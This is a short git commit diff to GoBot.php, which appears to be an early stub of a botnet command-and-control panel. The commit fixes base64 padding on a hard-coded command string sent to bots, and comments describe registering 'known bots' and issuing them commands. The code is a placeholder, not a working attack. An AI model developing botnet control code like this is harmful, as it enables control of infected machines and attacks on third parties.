22c2ec20ee79f659346400a7bfd38b01f82913b7
Adam <SaturnsVoid@users.noreply.github.com>
2015-10-08 13:16:26 -0400

    forgot a "="

--- GoBot.php
+++ GoBot.php
@@ -8,7 +8,7 @@ if (isset($_GET['get']))
 	//Get get, Check SQL for match
 	//if match found check for commands
 	//if match not found add to known bots
-  echo "QUxMfDF8aHR0cDovL3d3dy5nb29nbGUuY29tfFY";
+  echo "QUxMfDF8aHR0cDovL3d3dy5nb29nbGUuY29tfFY=";
 elseif (isset($_GET['test']))
 	echo "ok";
 else
